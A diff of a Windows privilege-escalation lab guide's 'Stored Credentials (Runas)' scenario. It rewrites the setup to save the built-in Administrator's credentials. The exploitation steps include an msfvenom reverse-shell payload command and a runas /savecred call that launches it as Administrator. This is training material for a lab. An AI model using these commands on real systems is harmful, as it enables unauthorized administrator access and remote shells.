@@ -25,22 +25,10 @@ In a scenario where an attacker has compromised an account with access to the Wi
 
 :warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>
 
-1) Open a command-prompt with local Administrator privileges and create a new user with the following command:
+1) Open a command prompt with local Administrator privileges and execute the following command to store credentials in the Windows Credentials Manager:
 
 ```
-net user nickvourd Passw0rd! /add
-```
-
-2) Add the new user to Administrator's local group:
-
-```
-net localgroup "Administrators" nickvourd /add
-```
-
-3) Save credentials to Windows Credentials Manager:
-
-```
-runas /savecred /user:WORKGROUP\nickvourd cmd.exe
+runas /savecred /user:WORKGROUP\Administrator cmd.exe
 ```
 
 Outcome:
@@ -55,7 +43,7 @@ Outcome:
 
 :warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>
 
-Another way to set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).
+To set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).
 
 Open a PowerShelll with local Administrator privileges and run the script:
 
@@ -93,18 +81,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.e
 
 2) Transfer the malicious executable file to victim's machine.
 
-3) open a listener from your attacking machine.
+3) Open a listener from your attacking machine.
 
-4) Grant full access permissions to all users:
-
-```
-icacls "C:\Windows\Tasks\nikos.exe" /grant Users:F
-```
-
-5) Open a command-prompt with regular user privileges and execute the following command:
+4) Open a command-prompt with regular user privileges and execute the following command:
 
 ```
-runas /savecred /user:WORKGROUP\nickvourd "C:\Windows\Tasks\nikos.exe"
+runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Tasks\nikos.exe"
 ```
 
 Outcome:
